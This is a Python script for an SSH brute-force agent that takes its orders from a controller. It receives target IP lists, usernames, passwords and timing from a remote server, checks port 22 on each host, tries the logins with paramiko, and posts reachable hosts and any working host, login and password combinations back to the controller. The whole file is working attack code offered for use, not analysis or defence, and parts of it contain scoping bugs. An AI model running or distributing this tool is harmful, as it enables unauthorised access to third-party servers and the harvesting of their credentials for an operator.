import paramiko
import socket
from datetime import datetime
from termcolor import colored
from threading import Lock, Thread
from queue import Queue
import time
import requests
import json

sleep_time = 0
item = 0

def check_ssh(server_ip, port=22):
    try:
        test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        test_socket.connect((server_ip, port))
    except Exception as ex:
        return False
    else:
        test_socket.close()
    return True 

def ssh_bruteforce(host, port, username, password):
    global lock
    global number
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for ip in host:
        if(check_ssh(ip,port)):
            payload = {'1': 'SSHABLE', '2': 'Server on '+ip+'/'+str(port)+' by agent№'+str(number)+''}
            global item
            r = requests.post(item, params=payload)
            print("posted")
            for log in username:
                    try:
                        ssh.connect(ip, port=port, username=log, password=password)
                    except Exception as ex:
                        with lock:
                            print(f"[Attempt] target:- {ip} - login:{log} - password:{password}")
                            print(ex)
                    else:
                        with lock:
                            payload = {'1': 'Found', '2': 'host:'+ip+'/'+str(port)+'  login:'+log+'  password:'+password+' '}
                            r = requests.post(item, params=payload)
                    finally:
                        ssh.close()
                        time.sleep(sleep_time)
    

def con_threads(host, port, username):
    global q
    while True:
        password = q.get()
        print(password)
        result = ssh_bruteforce(host, port, username, password)
        q.task_done()

def main(host, port, username, wordlist, threads):
    global q
    passwords = wordlist
    for thread in range(threads):
        thread = Thread(target=con_threads, args=(host, port, username))
        thread.daemon = True
        thread.start()
    for worker in passwords:
        q.put(worker)
    q.join()
    tryRestart()
number=0

def tryRestart():
    payload = {'1': 'restart', '2': str(number)}
    try:
            global number, sleep_time
            item="http://"+val+":"+val2+"/"
            r = requests.get(item, payload)
            data  = json.loads(r.text)
            number=data[0]
            ips=data[1]
            login=data[2]
            pas=data[3]
            sleep_time=data[4]
    except Exception as ex:
            print(ex)
    q = Queue()
    lock = Lock()
    print(colored(f"\n\nSSH-Bruteforce starting on {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n", 'yellow'))
    main(ips, 22, login, pas, 1)
    

if __name__ == "__main__":
    Checker=False
    while Checker==False:
        val = input("Enter server ip: ")
        if(val==""):
            val="127.0.0.1"
        val2 = input("Enter server port: ")
        if(val2==""):
            val2="8000"
        payload = {'1': 'begin', '2': '1'}
        try:
            item="http://"+val+":"+val2+"/"
            r = requests.get(item, payload)
            data  = json.loads(r.text)
            number=data[0]
            ips=data[1]
            login=data[2]
            pas=data[3]
            sleep_time=data[4]
            Checker=True
        except Exception as ex:
            print(ex)
    q = Queue()
    lock = Lock()
    print(colored(f"\n\nSSH-Bruteforce starting on {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n", 'yellow'))
    main(ips, 22, login, pas, 1)



def SendBye():
    if (number!=0):
        payload = {'1': 'end', '2': str(number)}
        try:
                item="http://"+val+":"+val2+"/"
                r = requests.get(item, payload)
        except Exception as ex:
                print(ex)             
import atexit
atexit.register(SendBye)                                                              